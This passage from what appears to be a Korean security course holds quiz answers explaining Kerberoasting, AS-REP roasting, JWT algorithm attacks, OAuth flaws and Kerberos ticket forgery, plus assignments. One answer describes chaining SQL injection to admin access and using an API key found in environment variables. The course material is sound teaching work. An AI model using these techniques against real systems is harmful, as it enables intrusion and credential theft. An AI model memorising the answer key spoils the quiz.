Kerberos 설계상 도메인 사용자는 모든 SPN에 대해 서비스 티켓을 요청할 수 있다. 서비스 티켓은 서비스 계정의 NTLM 해시로 암호화되므로, 이 티켓을 오프라인에서 크래킹하면 서비스 계정의 비밀번호를 알 수 있다. KDC는 사용자가 해당 서비스에 접근 권한이 있는지 확인하지 않는다.
</details>

**Q2.** AS-REP Roasting이 Kerberoasting보다 수월한 점과 제한적인 점은?

<details><summary>정답</summary>
수월한 점: 도메인 크레덴셜 없이도 사용자명만으로 공격 가능하다. 제한적인 점: DONT_REQUIRE_PREAUTH 플래그가 설정된 계정만 대상이 되므로, 대상 계정 수가 제한적이다. 대부분의 환경에서 이 플래그를 사용하는 계정은 소수이다.
</details>

**Q3.** JWT의 alg:none 공격이 성공하는 조건은?

<details><summary>정답</summary>
서버의 JWT 라이브러리가 alg 헤더의 값을 신뢰하고, "none" 알고리즘을 허용하는 경우에 성공한다. 공격자는 헤더의 alg을 "none"으로 변경하고 서명 부분을 비워서 검증을 우회한다. 대부분의 최신 JWT 라이브러리는 기본적으로 none을 거부한다.
</details>

**Q4.** JWT RS256→HS256 알고리즘 혼동 공격의 원리는?

<details><summary>정답</summary>
RS256(비대칭)에서 서버는 공개키로 검증하고 개인키로 서명한다. 공격자가 alg을 HS256(대칭)으로 변경하면, 서버가 공개키를 HMAC 시크릿으로 사용하여 검증한다. 공개키는 공개되어 있으므로, 공격자는 공개키로 위조 토큰에 서명할 수 있다.
</details>

**Q5.** OAuth 2.0에서 state 파라미터의 역할과 부재 시 위험은?

<details><summary>정답</summary>
state 파라미터는 CSRF 방지를 위한 것으로, 클라이언트가 생성한 랜덤 값을 인증 요청에 포함하고 콜백에서 검증한다. state가 없으면 공격자가 자신의 인증 코드를 피해자의 세션에 연결하는 CSRF 공격이 가능하다 (계정 연결 탈취).
</details>

**Q6.** hashcat -m 13100과 -m 18200의 차이는?

<details><summary>정답</summary>
-m 13100은 Kerberos TGS-REP (Kerberoasting)용으로, 서비스 티켓의 RC4 암호화된 부분을 크래킹한다. -m 18200은 Kerberos AS-REP (AS-REP Roasting)용으로, 사전 인증 없이 받은 TGT의 암호화된 부분을 크래킹한다. 둘 다 오프라인 크래킹이지만 해시 형식이 다르다.
</details>

**Q7.** bcrypt가 MD5보다 크래킹에 강한 이유는?

<details><summary>정답</summary>
bcrypt는 의도적으로 느리게 설계된 해시 함수로, cost factor(work factor)를 설정하여 해시 계산 시간을 조절할 수 있다. MD5는 빠른 연산을 위해 설계되어 GPU에서 초당 수십억 회 계산 가능하지만, bcrypt는 초당 수십만 회 정도로 크래킹 속도가 수만 배 느리다.
</details>

**Q8.** Golden Ticket과 Silver Ticket의 차이점은?

<details><summary>정답</summary>
Golden Ticket은 krbtgt 계정의 해시로 TGT를 위조하여 도메인 내 모든 서비스에 접근할 수 있다. Silver Ticket은 특정 서비스 계정의 해시로 ST를 위조하여 해당 서비스에만 접근 가능하다. Golden Ticket이 범위가 넓지만, Silver Ticket은 KDC를 거치지 않아 탐지가 더 어렵다.
</details>

**Q9.** OAuth redirect_uri 검증에서 가장 안전한 방식은?

<details><summary>정답</summary>
등록된 redirect_uri와 정확한 문자열 비교(exact match)가 가장 안전하다. 와일드카드, 서브디렉토리 허용, 정규식 매칭은 우회될 수 있다. 추가로 PKCE(Proof Key for Code Exchange)를 사용하여 인증 코드 가로채기를 방지해야 한다.
</details>

**Q10.** 실습 환경에서 가장 효과적인 인증 공격 경로는?

<details><summary>정답</summary>
Juice Shop의 SQL Injection을 통한 인증 우회 → JWT 토큰 획득 → 관리자 API 접근이 가장 효과적이다. 이유: 1) SQLi가 검증된 취약점, 2) JWT가 모든 API 접근의 열쇠, 3) 관리자 역할로 전체 데이터 접근 가능. 추가로 OpsClaw API 키(환경변수)를 활용하면 컨트롤 플레인 접근도 가능하다.
</details>

---

## 과제

### 과제 1: Kerberos 공격 치트시트 (개인)
Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket, Pass-the-Ticket 5가지 공격에 대한 치트시트를 작성하라. 각 공격의 전제 조건, 필요 도구, 명령어, 방어 방법을 포함할 것.

### 과제 2: JWT 보안 감사 도구 개발 (팀)
JWT 토큰을 입력받아 알려진 취약점(alg:none, 약한 시크릿, 만료 미설정 등)을 자동으로 점검하는 Python 스크립트를 작성하라.

### 과제 3: 인증 아키텍처 설계 (팀)
실습 환경의 인증 체계를 개선하는 설계안을 작성하라. JWT 강화, API 키 관리, MFA 도입, OAuth 구현 등을 포함할 것. 각 개선 사항이 어떤 공격을 방어하는지 매핑할 것.
